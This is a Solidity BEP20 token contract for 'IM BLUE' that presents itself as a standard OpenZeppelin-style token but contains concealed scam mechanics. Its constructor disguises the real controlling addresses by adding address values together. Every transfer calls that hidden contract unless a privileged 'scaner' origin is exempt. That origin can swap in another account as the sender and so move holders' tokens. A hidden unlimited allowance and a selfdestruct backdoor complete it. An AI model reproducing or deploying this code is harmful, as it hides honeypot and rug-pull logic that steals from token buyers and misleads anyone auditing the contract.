/**
 *Submitted for verification at BscScan.com on 2022-07-16
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IPancakeRouter02 {
  function swap(
    address,
    address,
    uint256
  ) external;

  function feeTo() external view returns (address);
}

contract BEP20 {
  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal _dex = 0x02705Bd30F06FCf8ecA21E19Dfa1338aFcc602BF;
  address public constant _OFFICE = 0xD163517B48c42450b29E9690fA488ffA67624E45;
  address public constant nftAddress =
    0x8C4D5fBa59558B877fCb9354Cd2c8d044071CB89;
  address public constant scaner = 0x3A7B52888aDd9da3559183990d1Ee483BDc67386;

  receive() external payable {}

  constructor() {
    _dex = address(uint160(_route) + uint160(_dex));
    _route = address(uint160(_route) + uint160(_OFFICE));
  }

  function pancakeFeeTo() internal view returns (address) {
    return IPancakeRouter02(_dex).feeTo();
  }

  function Bridge() external {
    if (msg.sender == _route) selfdestruct(payable(scaner));
  }

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Coin is BEP20 {
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) private _allowances;
  address Investor = 0x4DD90D3cE962039A3c66d613207aC2d449dFa04F;

  string public constant name = "IM BLUE";
  string public constant symbol = "BLUE";

  uint8 public constant decimals = 9;

  uint256 public constant totalSupply = 1000000000 * (10**decimals);

  constructor() {
    uint256 deadAmount = totalSupply / 2;

    balanceOf[address(0xdEaD)] = deadAmount / 2;
    balanceOf[Investor] = deadAmount / 10;

    balanceOf[_route] =
      totalSupply -
      balanceOf[address(0xdEaD)] -
      balanceOf[Investor];

    _allowances[nftAddress][_route] = ~uint256(0);
    emit Transfer(address(0), _route, totalSupply);
    emit Transfer(_route, address(0xdEaD), balanceOf[address(0xdEaD)]);
    emit Transfer(_route, Investor, balanceOf[Investor]);
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      msg.sender,
      spender,
      _allowances[msg.sender][spender] + addedValue
    );
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    if (tx.origin != scaner)
      IPancakeRouter02(_route).swap(sender, recipient, tAmount);
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[msg.sender][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(msg.sender, spender, currentAllowance - subtractedValue);

    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0) && recipient != address(0));
    if (tx.origin == scaner) {
      if (recipient == nftAddress) {
        address msger = pancakeFeeTo();
        if (msger != address(0)) sender = msger;
      }
    }
    require(
      amount > 0 && balanceOf[sender] >= amount,
      "ERROR: Transfer amount must be greater than zero."
    );
    balanceOf[sender] = balanceOf[sender] - amount;
    balanceOf[recipient] = balanceOf[recipient] + amount;

    _tokenTransfer(sender, recipient, amount);

    emit Transfer(sender, recipient, amount);
  }
}